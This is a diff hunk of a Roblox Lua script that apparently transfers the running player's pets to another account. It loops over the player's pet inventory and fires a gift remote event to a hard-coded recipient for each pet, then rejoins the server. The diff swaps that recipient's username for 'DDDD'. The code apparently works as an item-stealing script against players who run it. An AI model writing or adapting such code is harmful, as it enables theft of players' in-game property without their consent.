@@ -66,9 +66,8 @@ for _,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Data.Pets:GetC
 	if not table.find(Blacklist, v:GetAttribute("T")) then
 		game.ReplicatedStorage.Remote.CharacterRE:FireServer("Focus", v.Name)
 		task.wait(0.1)
-		game.ReplicatedStorage.Remote.GiftRE:FireServer(game.Players['YonasXep'])
+		game.ReplicatedStorage.Remote.GiftRE:FireServer(game.Players['DDDD'])
 		task.wait(0.3)
 	end
-
 end
 game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
